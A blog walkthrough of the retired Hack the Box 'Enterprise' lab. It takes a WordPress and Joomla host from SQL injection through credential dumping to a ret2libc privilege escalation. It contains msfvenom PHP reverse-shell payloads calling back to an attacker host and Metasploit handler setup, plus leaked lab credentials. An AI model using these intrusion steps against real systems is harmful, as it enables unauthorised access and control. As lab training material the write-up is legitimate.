@@ -1,0 +1,408 @@
+
+								
+																		Hack the Box Challenge: Enterprises Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on July 17, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello friends!! Today we are going to solve another CTF challenge “Enterprise” which is available online for those who want to increase their skill in penetration testing and black box testing. Enterprise is retired vulnerable lab presented by Hack the Box for making online penetration practices according to your experience level; they have the collection of vulnerable labs as challenges from beginners to Expert level.
+Level: Expert
+Task: find user.txt and root.txt file on victim’s machine.
+Since these labs are online available therefore they have static IP and IP of sense is 10.10.10.61 so let’s begin with nmap port enumeration.
+
+		
+		
+			
+			
+			
+			
+nmap -sV 10.10.10.61
+			
+				
+					
+				
+					1
+				
+						nmap -sV 10.10.10.61
+					
+				
+			
+		
+
+From given below image, you can observe we found port 22, 80, 443 and 80 are open on target system.
+
+As port 80 is running http server we open the target machine’s ip address in our browser, and find a website that is running on wordpress.
+
+As port 8080 is also running http server we open the target machine’s ip address in our browser, and find a website that is not made on wordpress.
+
+When we try to open the wordpress admin page but are redirected to domain called “enterprise.htb”. We enter the domain name in /etc/hosts file.
+
+Now when we open wp-admin, we are able to get the login page.
+
+We run dirb on port 80 to enumerate the directories and find a directory called /files.
+
+		
+		
+			
+			
+			
+			
+dirb http://10.10.10.61
+			
+				
+					
+				
+					1
+				
+						dirb http://10.10.10.61
+					
+				
+			
+		
+
+
+We open the files/ directory, and find a zip file.
+
+We download the zip file in our system and unzip it. After unzipping it we find 3 php files.
+
+We take a look at the content of the files and it looks like there might be plugin called lcars that is being used by the wordpress site and by the looks of the code it is possible that is vulnerable to SQL-injection.
+
+Now when we open it we get a php error message, we now know that this plugin is vulnerable to SQL-injection.
+
+ 
+We use sqlmap to dump the database and found a message with a few passwords. We also find that there is a joomla database we try to dump it and find a username geordi.la.forge.
+
+Now we use one of these passwords to login into wordpress. On the webpage we see that there are has been posts made by user william.riker. So we use credentials william.riker:u*Z14ru0p#ttj83zS6 to login into wordpress control panel.
+
+Now we change the 404.php template with our payload to get reverse shell on the machine. First we are going to create our payload using msfvenom.
+
+		
+		
+			
+			
+			
+			
+msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.25 lport=4444 –f raw
+			
+				
+					
+				
+					1
+				
+						msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.25 lport=4444 –f raw
+					
+				
+			
+		
+
+
+Now we are going to setup our listener using metasploit.
+
+		
+		
+			
+			
+			
+			
+msf &gt; use exploit/multi/handler
+msf exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp
+msf exploit(multi/handler) &gt; set lhost 10.10.14.25
+msf exploit(multi/handler) &gt; set lport 4444
+msf exploit(multi/handler) &gt; run
+			
+				
+					
+				
+					12345
+				
+						msf &gt; use exploit/multi/handlermsf exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcpmsf exploit(multi/handler) &gt; set lhost 10.10.14.25msf exploit(multi/handler) &gt; set lport 4444msf exploit(multi/handler) &gt; run
+					
+				
+			
+		
+
+ 
+After replacing the 404.php code with our payload, we open the 404.php page in our browser.
+
+As soon as we open it we get our reverse shell.
+
+After getting our reverse shell we find that we are actually in a container app and we find the machine has 2 network card.
+
+Now we find all the ip’s in the subnet of the container.
+
+Now we create another shell using msfvenom to upload it into the joomla site on port 8080.
+
+Now we background our session and change the lport according to our payload.
+
+		
+		
+			
+			
+			
+			
+meterpreter &gt; background
+msf exploit(multi/handler) &gt; set lport 4455
+msf exploit(multi/handler) &gt; run
+			
+				
+					
+				
+					123
+				
+						meterpreter &gt; backgroundmsf exploit(multi/handler) &gt; set lport 4455msf exploit(multi/handler) &gt; run
+					
+				
+			
+		
+
+ 
+We are first going to login into the joomla site, using credentials, geordi.la.forge:ZD3YxfnSjezg67JZ and upload our shell code.
+
+As soon as we open the page we get our reverse shell.
+
+After getting into the joomla container, we find that we have common file called /var/www/html/files.
+
+We create another php payload using msfvenom to upload this shell into /var/www/html/files directory.
+
+		
+		
+			
+			
+			
+			
+msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.25 lport=4444 -f raw &gt; shell1.php
+			
+				
+					
+				
+					1
+				
+						msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.25 lport=4444 -f raw &gt; shell1.php
+					
+				
+			
+		
+
+
+We go to /var/www/html/files directory and upload the shell using meterpreter.
+
+Now we background our current session and change the lport according to our new payload.
+
+		
+		
+			
+			
+			
+			
+meterpreter &gt; background
+msf exploit(multi/handler) &gt; set lport 5555
+msf exploit(multi/handler) &gt; run
+			
+				
+					
+				
+					123
+				
+						meterpreter &gt; backgroundmsf exploit(multi/handler) &gt; set lport 5555msf exploit(multi/handler) &gt; run
+					
+				
+			
+		
+
+
+When we go to /files directory we find that our shell has been uploaded.
+
+As soon as we click on the payload we get our reverse shell.
+
+After getting the reverse shell on the main machine instead of container we try to find files with suid bit set.
+
+		
+		
+			
+			
+			
+			
+find / -perm -4000 2&gt;/dev/null
+			
+				
+					
+				
+					1
+				
+						find / -perm -4000 2&gt;/dev/null
+					
+				
+			
+		
+
+
+We find a file called lcars, we find that it has been running on port 32812.
+
+When we connect with it using netcat we find that it asks for access code.
+
+We run the file on the target machine using ltrace to find the access code for this binary.
+
+We find that when we pass a it gets compared to a string called pircarda1. We use this to login into the binary.
+
+We are able to access the file using this binary now we try to find this program is vulnerable to buffer overflow. We open the file using gdb to read the assembly code.
+
+Now create 500 byte long string using pattern_create.rb script to find the EIP offset.
+
+		
+		
+			
+			
+			
+			
+./pattern_create.rb -l 500
+			
+				
+					
+				
+					1
+				
+						./pattern_create.rb -l 500
+					
+				
+			
+		
+
+
+After searching all the options we find that option number 4 was vulnerable to buffer overflow.
+
+We pass that into /usr/share/metasploit-framework/tools/pattern_offset.rb, we get an offset of 212. So we need to write 212 characters and then write the address of the instructions we want to be executed.
+
+		
+		
+			
+			
+			
+			
+./pattern_offset -q 31684130 -l 500
+			
+				
+					
+				
+					1
+				
+						./pattern_offset -q 31684130 -l 500
+					
+				
+			
+		
+
+
+Now when we try to insert shellcode into the buffer but we were unable to execute it because of DEP. It prevents code from being executed in the stack. Now we are going to do a ret2libc attack to execute a process already present in the process’ executable memory. We go into the target machine and find ASLR in enabled so we have to brute force the address. Now we find the address of system, exit and /bin/sh.
+
+		
+		
+			
+			
+			
+			
+gdb /bin/lcars
+(gdb) b main
+(gdb) run
+(gdb) p system
+(gdb) find 0xf7e0bd10, +9999999, "/bin/sh"
+(gdb) p exit
+			
+				
+					
+				
+					123456
+				
+						gdb /bin/lcars(gdb) b main(gdb) run(gdb) p system(gdb) find 0xf7e0bd10, +9999999, "/bin/sh"(gdb) p exit
+					
+				
+			
+		
+
+
+We create an exploit which can be found here. As soon as we run the exploit we get our reverse shell as root user. We go to /root directory and find a file called “root.txt”. When we open it we find our 1st flag. We then go to /home directory inside we find another directory called jeanlucpicard/. Inside /home/jeanlucpicard we find a file called “user.txt”, we open it and find our final flag.
+
+Author: Sayantan Bera is a technical writer at hacking articles and cyber security enthusiast. Contact Here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
